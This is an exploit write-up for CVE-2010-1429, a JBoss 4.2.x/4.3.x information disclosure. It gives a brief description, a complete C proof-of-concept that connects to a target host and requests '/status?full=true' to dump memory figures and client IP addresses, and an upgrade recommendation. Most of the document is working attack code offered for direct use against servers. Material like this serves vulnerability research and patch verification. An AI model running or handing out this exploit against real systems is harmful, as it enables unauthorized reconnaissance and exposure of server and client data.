#JBoss sensitive information disclosure 4.2X & 4.3.X CVE-2010-1429
# Date: 02/08/2018
# POC Author: JameelNabbo
# Vendor Homepage: http://www.jboss.org
# Software Link: http://jbossas.jboss.org/downloads
# Version: 4.2X. & 4.3.X
# Tested on: Linux Ubuntu
# CVE : CVE-2010-1429

1. Description
   
By requesting the Status param and setting its value to true, Jobss will print a sensitive information such as Memory used/Total Memory / Client IP address.
Example:   http://127.0.01/status?full=true
 
   
2. Proof of Concept
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>


int socket_connect(char *host, in_port_t port){
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;
    
    if((hp = gethostbyname(host)) == NULL){
        herror("gethostbyname");
        exit(1);
    }
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    
    if(sock == -1){
        perror("setsockopt");
        exit(1);
    }
    
    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
        perror("connect");
        exit(1);
        
    }
    return sock;
}

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]){
    int fd;
    char buffer[BUFFER_SIZE];
    
    if(argc < 3){
        fprintf(stderr, "Usage: %s <hostname> <port>\n", argv[0]);
        exit(1);
    }
    
    fd = socket_connect(argv[1], atoi(argv[2]));
    write(fd, "GET /status?full=true\r\n", strlen("GET /status?full=true\r\n")); // write(fd, char[]*, len);
    while(read(fd, buffer, BUFFER_SIZE - 1) != 0){
         fprintf(stderr, "%s", buffer);
    }

    shutdown(fd, SHUT_RDWR);
    close(fd);
    return 0;
}

3. Solution :
Update to version 4.2.3 or later
